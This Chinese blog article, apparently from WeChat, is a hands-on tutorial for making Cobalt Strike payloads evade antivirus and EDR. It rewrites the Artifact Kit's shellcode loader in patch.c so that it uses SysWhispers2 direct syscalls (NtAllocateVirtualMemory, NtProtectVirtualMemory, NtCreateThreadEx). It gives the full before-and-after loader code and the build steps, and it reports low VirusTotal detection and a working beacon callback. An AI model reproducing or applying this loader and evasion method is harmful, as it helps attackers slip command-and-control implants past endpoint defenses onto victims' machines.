> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2Gui2tVOkG4JIRQe7gMP0A)

接上篇文章，简单分析了 Artifact Kit 的源码后，我们搞清楚了 Cobalt Strike 生成 artifact 的原理，以及 Artifact Kit 用到的一些免杀手法，本篇将结合上篇末尾的参考文章的思路进行实践。Artifact Kit 配合 Syswhispers2 工具实现对 AV/EDR 的部分 API 监控进行绕过，参考文章链接如下所示：

```
https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/
```

SysWhispers 功能
--------------

SysWhispers 通过生成植入程序可以用来进行直接系统调用的头文件 / ASM 文件来帮助规避，支持所有核心的系统调用，这意味着可以不再需要依赖 ntdll.dll 中 API 调用，这些调用通常被 EDR 挂钩。相反，我们可以使用 SysWhispers 生成的标头 / ASM 对直接执行相关的系统调用。首先需要弄清楚的是要替换哪些 API 调用，然后为这些未记录的函数提供参数。

这里我们使用 Artifact Kit 中的 bypass-peek 功能做个举例，创建项目，将 Artifact Kit 文件复制到项目中，然后观察下可以使用系统调用替换的函数。

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwu32CZJ9ib7AySFicBy1VkrAj8jEnS1XOQ93oWTAhYI9icfWaHj4P8hfl8A/640?wx_fmt=jpeg)

  

很快在 patch.c 中可以发现有三个被 AV/EDR 经常监控的 API，VirtualAlloc，VirtualProtect 和 CreateThread 函数，接下来用 SysWhispers 将其替换为系统调用。

```
void spawn(void * buffer, int length, char * key) { DWORD old; /* allocate the memory for our decoded payload */ void * ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int x; for (x = 0; x < length; x++) {  char temp = *((char *)buffer + x) ^ key[x % 4];  *((char *)ptr + x) = temp; }  /* propagate our key function pointers to our payload */ set_key_pointers(ptr);  /* change permissions to allow payload to run */ VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);  /* spawn a thread with our data */ CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);}
```

SysWhispers 使用方法
----------------

SysWhispers 支持的 API 列表如下所示：

*   NtCreateProcess (CreateProcess)
    
*   NtCreateThreadEx (CreateRemoteThread)
    
*   NtOpenProcess (OpenProcess)
    
*   NtOpenThread (OpenThread)
    
*   NtSuspendProcess
    
*   NtSuspendThread (SuspendThread)
    
*   NtResumeProcess
    
*   NtResumeThread (ResumeThread)
    
*   NtGetContextThread (GetThreadContext)
    
*   NtSetContextThread (SetThreadContext)
    
*   NtClose (CloseHandle)
    
*   NtReadVirtualMemory (ReadProcessMemory)
    
*   NtWriteVirtualMemory (WriteProcessMemory)
    
*   NtAllocateVirtualMemory (VirtualAllocEx)
    
*   NtProtectVirtualMemory (VirtualProtectEx)
    
*   NtFreeVirtualMemory (VirtualFreeEx)
    
*   NtQuerySystemInformation (GetSystemInfo)
    
*   NtQueryDirectoryFile
    
*   NtQueryInformationFile
    
*   NtQueryInformationProcess
    
*   NtQueryInformationThread
    
*   NtCreateSection (CreateFileMapping)
    
*   NtOpenSection
    
*   NtMapViewOfSection
    
*   NtUnmapViewOfSection
    
*   NtAdjustPrivilegesToken (AdjustTokenPrivileges)
    
*   NtDeviceIoControlFile (DeviceIoControl)
    
*   NtQueueApcThread (QueueUserAPC)
    
*   NtWaitForMultipleObjects (WaitForMultipleObjectsEx)
    

把项目 https://github.com/jthuraisamy/SysWhispers2 下载到本地，然后执行命令，

```
python syswhispers.py -f NtProtectVirtualMemory,NtAllocateVirtualMemory,NtCreateThreadEx -o syscalls
```

其中 **-f **表示要用来替换的系统调用函数，参照上面的列表，用逗号隔开，**-o ** 表示输出的文件名称，运行成功后会生成三个文件，需要复制到项目中去。

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwuehWWGZBFotSPocicfSafDoIslk2QAbCYdaTX42diaVCebf8aIBm1Uc8w/640?wx_fmt=jpeg)

  

结合流程
----

1.  将生成的 H/C/ASM 文件复制到项目文件夹中。
    
2.  在 Visual Studio 的解决方案资源管理器中，将 .h 和 .c/.asm 文件分别作为头文件和源文件添加到项目中。
    

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwuxs5bYn87YowcsXzY351ibHrF7NHZVNiceQRQq4AiabmUo8yL9oOdQNq4w/640?wx_fmt=jpeg)

  

3.  在 Visual Studio 中，打开项目 ——> 生成自定义 ，并启用 **masm**。
    

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwuJOThL8eotjXsRwX5Ko6onYgMd5yiaGD4D0mF911icN6Aw70kYQXg1A4Q/640?wx_fmt=jpeg)

  

4.  转到 ASM 文件的属性，并将_项类型_设置为 **Microsoft Macro Assembler**。
    

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwuK2ib1NMzgz63VHKEuZibE5rSA26oibHuLFoykrw6ghbiabj26R25wppYUg/640?wx_fmt=jpeg)

  

5.  SysWhispers2 只支持生成 x64 项目，如果要生成 x86 项目需要使用 mai1zhi2 师傅的 https://github.com/mai1zhi2/SysWhispers2_x86 项目，和 SysWhispers2 的使用方法差不多，把文件导入项目即可。
    

接下来就可以在 patch.c 中替换三个函数了，替换结果如下所示：

```
void spawn(void * buffer, int length, char * key) { HANDLE hProc = GetCurrentProcess(); DWORD oldprotect = 0; PVOID ptr = NULL; HANDLE thandle = NULL;    /* allocate the memory for our decoded payload */ NTSTATUS NTAVM = NtAllocateVirtualMemory(hProc, &ptr, 0, (PSIZE_T)&length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int x; for (x = 0; x < length; x++) {  char temp = *((char *)buffer + x) ^ key[x % 4];  *((char *)ptr + x) = temp; }  /* propagate our key function pointers to our payload */ set_key_pointers(ptr);  /* change permissions to allow payload to run */ NTSTATUS NTPVM = NtProtectVirtualMemory(hProc, &ptr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);  /* spawn a thread with our data */ NTSTATUS ct = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, ptr, NULL, FALSE, 0, 0, 0, NULL); WaitForSingleObject(thandle, INFINITE); free(ptr);}
```

然后就可以编译了，编译出来看下导出表，现在任何静态检查导入表的程序都无法得知其如何调用三个 API 了

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwuexQaj93iacOqJnLu9puAvpQFh5VNA6TPnWcSJ15Tw48wLUagWX5RH4w/640?wx_fmt=jpeg)

  

功能测试
----

将程序和目录中的同功能程序做替换，比如上面这个程序需要和 artifact64.exe 做替换，在 Cobalt Strike 中对应的生成操作是生成 64-bit staged artifact，如果要生成 stagless artifact，需要按照 build.sh 的规范，将 DATA_SIZE=271360。为了满足所有 Cobalt Strike 的生成 artifact 方法，按照如上方法创建了 6 个项目，dll 需要创建动态链接库项目，其他和 exe 同理。

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwuZHDeicX0g0ic6F6ic9wwAPCLUiatGPUN3H3pNJPfDiaZiasrRaovALR0e21g/640?wx_fmt=jpeg)

  

编译后，将文件替换加载 cna 脚本进行测试，上传 VT 结果（只是测试，建议测试杀软不要直接上传 VT，挨个虚拟机测试）：

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwuygRnicJovCSVTiaicNGTpxjE4lgAdy4WkqldyLU3rYM7T6t3snbqK33YA/640?wx_fmt=jpeg)

  

正常上线

![](https://mmbiz.qpic.cn/mmbiz_jpg/cOCqjucntdGfeEshXqKL8icibicSwfUBGwucelicDjNIrqxpKdrGPoOggZXJKeynwiavq7YS19zE93otmEJyuzEcOag/640?wx_fmt=jpeg)

还有个问题需要解决，Artifact Kit 的 shellcode 默认使用的是 xor 四字节加密，容易被识别，为了解决这个问题后续需要对 cna 脚本进行修改，还有添加一些新的反调试反 vm 手段。

**文中提到的相关代码已上传至知识星球。**

参考文章和项目
-------

*   https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/
    
*   https://github.com/jthuraisamy/SysWhispers2
    
*   https://github.com/mai1zhi2/SysWhispers2_x86
    

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdGgXGuibZ56sAeSjVFPyWEw25uaZEmwaGKmltLREfSVu5J7C9y8q7qg7GoGW5iapmeHKPoFY74Ha1fA/640?wx_fmt=png)